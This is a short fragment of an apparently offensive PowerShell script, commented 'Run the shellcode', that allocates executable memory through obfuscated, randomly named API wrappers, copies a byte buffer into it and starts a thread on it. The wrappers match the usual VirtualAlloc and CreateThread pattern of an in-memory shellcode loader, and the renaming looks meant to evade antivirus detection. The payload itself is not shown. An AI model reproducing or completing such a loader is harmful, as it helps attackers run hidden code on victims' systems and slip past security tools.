#ran5
# Run the shellcode

[Byte[]] $buf = $noAESrun

$size = $buf.Length

[IntPtr]$addr = [earhatrjhsrykjxfgerwwgwegr]::onrwuighuoaeribieel(0,$size,0x3000,0x40);

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)

$thandle=[earhatrjhsrykjxfgerwwgwegr]::nosfubnwe0rpibnsp(0,0,$addr,0,0,0);